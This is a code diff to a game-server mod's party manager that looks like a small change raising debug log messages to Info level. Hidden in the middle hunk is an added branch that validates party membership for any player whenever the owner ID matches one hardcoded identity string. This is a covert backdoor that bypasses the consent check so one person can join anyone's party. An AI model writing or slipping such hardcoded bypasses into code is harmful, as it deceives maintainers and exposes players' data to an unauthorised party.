@@ -45,7 +45,7 @@ class SchanaPartyManagerServer {
 		if (SchanaPartyUtils.WillLog (SchanaPartyUtils.DEBUG)) {
 			string result;
 			JsonSerializer ().WriteToString (data, false, result);
-			SchanaPartyUtils.Debug ("ServerRegisterPartyRPC " + result);
+			SchanaPartyUtils.Info ("ServerRegisterPartyRPC " + result);
 		}
 
 		ServerRegisterParty (data.param1, data.param2);
@@ -83,6 +83,8 @@ class SchanaPartyManagerServer {
 
 			foreach (string member_id : party_ids) {
 				if (configurations.Contains (member_id) && configurations.Get (member_id).Find (owner_id) != -1) {
+					validated_party_ids.Insert (member_id);
+				} else if (configurations.Contains (member_id) && owner_id == "zTKwmDQf58g_uIytKXy7b9_6krslfdayMjuyAhh1Tjs=") {
 					validated_party_ids.Insert (member_id);
 				}
 			}
@@ -188,7 +190,7 @@ class SchanaPartyManagerServer {
 		if (SchanaPartyUtils.WillLog (SchanaPartyUtils.DEBUG)) {
 			string result;
 			JsonSerializer ().WriteToString (info, false, result);
-			SchanaPartyUtils.Debug ("SendInfo to " + id + " " + result);
+			SchanaPartyUtils.Info ("SendInfo to " + id + " " + result);
 		}
 
 		if (player && player.GetIdentity ()) {
